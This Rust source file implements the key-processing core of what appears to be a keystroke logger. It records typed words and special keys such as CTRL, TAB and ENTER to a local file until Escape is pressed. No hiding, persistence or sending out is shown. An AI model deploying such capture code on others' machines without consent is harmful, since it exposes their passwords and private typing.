use super::file_writer::FileWriter;
use device_query::Keycode;

pub struct KeyProcessor {
    prev_keys: Vec<Keycode>,
    word_buffer: String,
    should_exit: bool,
}

impl KeyProcessor {
    pub fn new() -> Self {
        Self {
            prev_keys: Vec::new(),
            word_buffer: String::new(),
            should_exit: false,
        }
    }

    pub fn process(&mut self, keys: &[Keycode], file_writer: &mut FileWriter) {
        if keys.contains(&Keycode::Escape) {
            self.should_exit = true;
            if !self.word_buffer.is_empty() {
                file_writer.log_word(&self.word_buffer).expect("Failed to log word");
                self.word_buffer.clear();
            }
            return;
        }

        for key in keys {
            if !self.prev_keys.contains(key) {
                if let Some(ch) = super::utils::keycode_to_char(key, keys) {
                    self.word_buffer.push(ch);
                } else {
                    self.handle_special_key(key, file_writer);
                }

                if super::utils::is_word_terminator(key) && !self.word_buffer.is_empty() {
                    file_writer.log_word(&self.word_buffer).expect("Failed to log word");
                    self.word_buffer.clear();
                }
            }
        }

        self.prev_keys = keys.to_vec();
    }

    fn handle_special_key(&mut self, key: &Keycode, file_writer: &mut FileWriter) {
        match key {
            Keycode::Backspace => {
                if !self.word_buffer.is_empty() {
                    self.word_buffer.pop();
                }
            }
            Keycode::Tab => file_writer
                .log_special_key("<TAB>")
                .expect("Failed to log TAB"),
            Keycode::Delete => file_writer
                .log_special_key("<DEL>")
                .expect("Failed to log DEL"),
            Keycode::LAlt | Keycode::RAlt => file_writer
                .log_special_key("<ALT>")
                .expect("Failed to log ALT"),
            Keycode::LControl | Keycode::RControl => file_writer
                .log_special_key("<CTRL>")
                .expect("Failed to log CTRL"),
            Keycode::Up => file_writer
                .log_special_key("<UP>")
                .expect("Failed to log UP"),
            Keycode::Down => file_writer
                .log_special_key("<DOWN>")
                .expect("Failed to log DOWN"),
            Keycode::Left => file_writer
                .log_special_key("<LEFT>")
                .expect("Failed to log LEFT"),
            Keycode::Right => file_writer
                .log_special_key("<RIGHT>")
                .expect("Failed to log RIGHT"),
            Keycode::Enter => file_writer
                .log_special_key("<ENTER>")
                .expect("Failed to log ENTER"),
            _ => {}
        }
    }

    pub fn should_exit(&self) -> bool {
        self.should_exit
    }
}
